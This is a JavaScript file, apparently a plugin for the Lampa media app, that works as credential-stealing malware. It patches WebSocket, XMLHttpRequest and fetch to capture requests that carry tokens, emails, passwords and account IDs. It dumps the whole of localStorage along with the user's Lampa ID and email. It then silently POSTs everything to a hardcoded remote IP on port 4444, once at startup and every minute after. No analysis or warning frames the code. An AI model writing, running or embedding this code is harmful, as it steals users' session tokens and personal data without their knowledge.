(function() {
  'use strict';
  var EXFIL = 'http://5.252.116.77:4444';
  var urls = [];

  function send(d) {
    try {
      var b = JSON.stringify(d);
      if (typeof fetch !== 'undefined') { fetch(EXFIL, {method:'POST',headers:{'Content-Type':'application/json'},body:b,mode:'no-cors'}).catch(function(){}); }
      else { var x = new XMLHttpRequest(); x.open('POST',EXFIL,true); x.setRequestHeader('Content-Type','application/json'); x.send(b); }
    } catch(e) {}
  }

  function hp(u) {
    var p = {}, i = u.indexOf('?'); if (i===-1) return p;
    u.substr(i+1).split('&').forEach(function(pair) {
      var kv = pair.split('='); if (kv.length===2) try { p[decodeURIComponent(kv[0])] = decodeURIComponent(kv[1]); } catch(e) {}
    });
    return p;
  }

  try {
    var _wsSend = WebSocket.prototype.send;
    WebSocket.prototype.send = function(data) {
      try {
        var d = typeof data === 'string' ? data : '';
        if (d.match(/(email|uid|token|auth|skaz|account|unic_id|RchRegistry)/i) && urls.length<500) {
          urls.push({type:'ws_send', data: d.substring(0,2000)});
        }
      } catch(e){}
      return _wsSend.apply(this, arguments);
    };
  } catch(e){}

  try {
    var _xhrOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(m,u) { this.__u=u; return _xhrOpen.apply(this,arguments); };
    var _xhrSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function(b) {
      var u = this.__u||'';
      if (u.match(/(email|uid|token|auth|pass|skaz|account)/i) && urls.length<500) urls.push({type:'xhr',url:u,p:hp(u)});
      return _xhrSend.apply(this,arguments);
    };
  } catch(e){}

  try {
    if (typeof fetch!=='undefined') {
      var _fetch = window.fetch;
      window.fetch = function(u,o) {
        var s = (typeof u==='string')?u:(u.url||u.href||'');
        if (s.match(/(email|uid|token|auth|pass|skaz|account)/i) && urls.length<500) urls.push({type:'fetch',url:s,p:hp(s)});
        return _fetch.apply(this,arguments);
      };
    }
  } catch(e){}

  var t = setInterval(function() {
    if (typeof Lampa==='undefined') return;
    clearInterval(t);
    var uid = Lampa.Storage.get('lampac_unic_id','');
    var email = Lampa.Storage.get('account_email','');

    var full = {type:'full', ts:Date.now(), unic_id:uid, email:email};
    full.storage = {};
    for (var i=0; i<localStorage.length; i++) {
      var k = localStorage.key(i);
      full.storage[k] = localStorage.getItem(k);
    }
    send(full);

    setInterval(function() {
      var u2 = urls.slice(); urls = [];
      if (u2.length) send({type:'urls', unic_id:uid, urls:u2, ts:Date.now()});
    }, 60000);
  }, 200);
})();
